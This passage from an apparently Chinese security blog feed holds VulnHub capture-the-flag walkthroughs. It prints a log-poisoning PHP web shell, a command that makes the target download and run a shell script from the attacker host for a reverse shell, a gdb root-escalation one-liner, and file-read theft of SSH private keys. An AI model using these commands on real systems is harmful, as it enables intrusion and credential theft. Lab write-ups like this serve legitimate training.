&lt;p&gt;用 curl 发送数据包，下载木马&lt;br&gt;
 curl -i -s -k -X $‘GET’ \&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;H &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;U&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mi&gt;M&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mn&gt;5.0&lt;/mn&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;?&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;&amp;#x27;User-Agent: Mozilla/5.0 &amp;lt;?php system(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.835222em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;U&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;M&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_GET[‘y’]);?&amp;gt; (Macintosh; Intel&lt;br&gt;
Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0&lt;br&gt;
Safari/537.36’ &lt;br&gt;
$‘&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLQ==&#34;&gt;http://192.168.0.172/cgi-&lt;/span&gt;&lt;br&gt;
data/getImage.php?file=/var/log/durian.log/access.log&amp;amp;y=wget+http://192.168.0.168/&lt;br&gt;
shell.sh±O+/var/www/html/blog/shell1.sh’&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1549.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;当看到 python 服务器上有了回馈信息后，就说明是正确的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1550.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;执行下载的程序，并且用来接收 shell&lt;br&gt;
curl -i -s -k -X $‘GET’ \&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;H &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;U&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;:&lt;/mo&gt;&lt;mi&gt;M&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mn&gt;5.0&lt;/mn&gt;&lt;mo&gt;&amp;lt;&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;?&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;&amp;#x27;User-Agent: Mozilla/5.0 &amp;lt;?php system(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.835222em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;U&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8777699999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;M&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;lt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_GET[‘y’]);?&amp;gt; (Macintosh; Intel&lt;br&gt;
Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0&lt;br&gt;
Safari/537.36’ &lt;br&gt;
$‘&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLQ==&#34;&gt;http://192.168.0.172/cgi-&lt;/span&gt;&lt;br&gt;
data/getImage.php?file=/var/log/durian.log/access.log&amp;amp;y=bash+/var/www/html/blog/&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NoZWxsMS5zaA==&#34;&gt;shell1.sh&lt;/span&gt;’&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1551.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;成功拿到网站权限，开始提权，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1saW5wZWFzLTR0M2tnbXM0YTQxNHAuc2g=&#34;&gt;放了一个 linpeas.sh&lt;/span&gt;, 查到 gdb 权限设置错误&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1552.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;参照 gtfobin，直接提权为 root 用户&lt;br&gt;
 gdb -nx -ex ‘python import os; os.setuid (0)’ -ex ‘!sh’ -ex quit&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1553.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;–&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/146%20NEMESIS/</guid>
            <title>VULNHUB 46 NEMESIS</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/146%20NEMESIS/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWEtbmVtZXNpcy0xMDEsNTgyLw==&#34;&gt;https://www.vulnhub.com/entry/ia-nemesis-101,582/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaW5mb3NlY2FydGljbGVzLmNvbS9uZW1lc2lzLXZ1bG5odWItd2Fsa3Rocm91Z2gv&#34;&gt;https://www.infosecarticles.com/nemesis-vulnhub-walkthrough/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;001-确认攻击目标的财产信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#001-确认攻击目标的财产信息&#34;&gt;#&lt;/a&gt; 001 确认攻击目标的财产信息&lt;/h3&gt;
&lt;p&gt;攻击机 kali： 1 92.168. 0. 168 (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 NEMESIS：桥接于 1 92.168. 0 .1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | uniq&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1399.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;粗略的识别一下该 ip 上开放了哪些端口&lt;br&gt;
 sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | xargs sudo nmap -PA&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1400.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;à 靶机 ip：192.168. 0. 184 , 靶机开放端口 80&lt;/p&gt;
&lt;h3 id=&#34;对靶机开放的端口做更深一步的检索检索各个服务上的详细信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#对靶机开放的端口做更深一步的检索检索各个服务上的详细信息&#34;&gt;#&lt;/a&gt; 对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1402.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;检索到的有效服务如下所示&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#检索到的有效服务如下所示&#34;&gt;#&lt;/a&gt; 检索到的有效服务如下所示：&lt;/h3&gt;
&lt;p&gt;52846 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
 80 、 52845 http：可对 web 进行渗透测试收集信息&lt;/p&gt;
&lt;h3 id=&#34;002-目录扫描任意文件读取读私钥文件连ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#002-目录扫描任意文件读取读私钥文件连ssh&#34;&gt;#&lt;/a&gt; 002 目录扫描，任意文件读取，读私钥文件连 ssh&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjgu&#34;&gt;http://192.168.&lt;/span&gt; 0. 184 / 进行信息收集&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1403.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;到处看了看发现有一个用户名和密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#到处看了看发现有一个用户名和密码&#34;&gt;#&lt;/a&gt; 到处看了看，发现有一个用户名和密码&lt;/h3&gt;
&lt;p&gt;Login Details =&amp;gt; username : hacker_in_the_town password : thanos&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1404.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;找到登陆界面用这个账户密码尝试登陆&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#找到登陆界面用这个账户密码尝试登陆&#34;&gt;#&lt;/a&gt; 找到登陆界面，用这个账户密码尝试登陆&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1405.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;登陆成功但是进入到登陆后的界面查询之后没有任何发现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#登陆成功但是进入到登陆后的界面查询之后没有任何发现&#34;&gt;#&lt;/a&gt; 登陆成功，但是进入到登陆后的界面，查询之后没有任何发现&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1406.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;用字典爆破目录收集目录信息信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用字典爆破目录收集目录信息信息&#34;&gt;#&lt;/a&gt; 用字典爆破目录，收集目录信息信息&lt;/h3&gt;
&lt;p&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-&lt;br&gt;
list-2.3-medium.txt -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODQv&#34;&gt;http://192.168.0.184/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1407.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;依次访问几个目录发现没有比较明显的漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#依次访问几个目录发现没有比较明显的漏洞&#34;&gt;#&lt;/a&gt; 依次访问几个目录发现没有比较明显的漏洞&lt;/h3&gt;
&lt;h3 id=&#34;换个字典在爆破一波目录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#换个字典在爆破一波目录&#34;&gt;#&lt;/a&gt; 换个字典，在爆破一波目录&lt;/h3&gt;
&lt;p&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirb/common.txt -u&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODQv&#34;&gt;http://192.168.0.184/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1408.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;爆出来的目录里边都没有什么发现看一下下一个端口网站&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#爆出来的目录里边都没有什么发现看一下下一个端口网站&#34;&gt;#&lt;/a&gt; 爆出来的目录里边都没有什么发现，看一下下一个端口网站&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjgu&#34;&gt;http://192.168.&lt;/span&gt; 0 .184:52845/ 进行信息收集&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1410.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-&lt;br&gt;
2.3-medium.txt -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODQ6NTI4NDU=&#34;&gt;http://192.168.0.184:52845&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1411.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirb/common.txt -u&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODQ6NTI4NDUv&#34;&gt;http://192.168.0.184:52845/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1412.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;目录都没有什么问题看来只能对页面的功能点尝试了&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#目录都没有什么问题看来只能对页面的功能点尝试了&#34;&gt;#&lt;/a&gt; 目录都没有什么问题，看来只能对页面的功能点尝试了&lt;/h3&gt;
&lt;h3 id=&#34;在如下界面中找到一个发送信息的功能输入了如下信息之后发现有回显&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#在如下界面中找到一个发送信息的功能输入了如下信息之后发现有回显&#34;&gt;#&lt;/a&gt; 在如下界面中，找到一个发送信息的功能，输入了如下信息之后发现有回显&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1414.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;点击发送消息后，读取到了 passwd 文件，审查源代码进行规范化，我们拿到了&lt;br&gt;
有 shell 的三个用户分别为 root，carlos，thanos&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1415.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;既然能读取文件不妨测试一下是否能读到私钥文件通过私钥文件登陆靶机&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#既然能读取文件不妨测试一下是否能读到私钥文件通过私钥文件登陆靶机&#34;&gt;#&lt;/a&gt; 既然能读取文件，不妨测试一下是否能读到私钥文件，通过私钥文件登陆靶机&lt;/h3&gt;
&lt;p&gt;依次读取这三个用户下的.ssh 文件夹下的 id_rsa 文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1416.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;root 下的没有读取到，可能是做了权限设置或者不存在私钥文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1417.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;thanos 下的读取到了，审查源代码处复制私钥到本地&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1418.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;最后把 carlos 下的私钥文件看看&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1419.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;这个用户下的私钥文件也没有读取到&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#这个用户下的私钥文件也没有读取到&#34;&gt;#&lt;/a&gt; 这个用户下的私钥文件也没有读取到&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1420.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;003-特权用户定期执行的py提权py反弹shell优化代码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#003-特权用户定期执行的py提权py反弹shell优化代码&#34;&gt;#&lt;/a&gt; 003 特权用户定期执行的 py 提权，py 反弹 shell 优化代码&lt;/h3&gt;
&lt;h3 id=&#34;根据泄漏的私钥文件登陆到靶机中注意修改私钥文件的权限&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#根据泄漏的私钥文件登陆到靶机中注意修改私钥文件的权限&#34;&gt;#&lt;/a&gt; 根据泄漏的私钥文件登陆到靶机中，注意修改私钥文件的权限&lt;/h3&gt;
&lt;p&gt;chmod 600 thanos_id_rsa&lt;br&gt;
ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOnRoYW5vc0AxOTIuMTY4LjMxLjQ3&#34;&gt;thanos@192.168.31.47&lt;/span&gt; -p 52846 -i ~/Desktop/vulnhub/nemesis/thanos_id_rsa&lt;/p&gt;
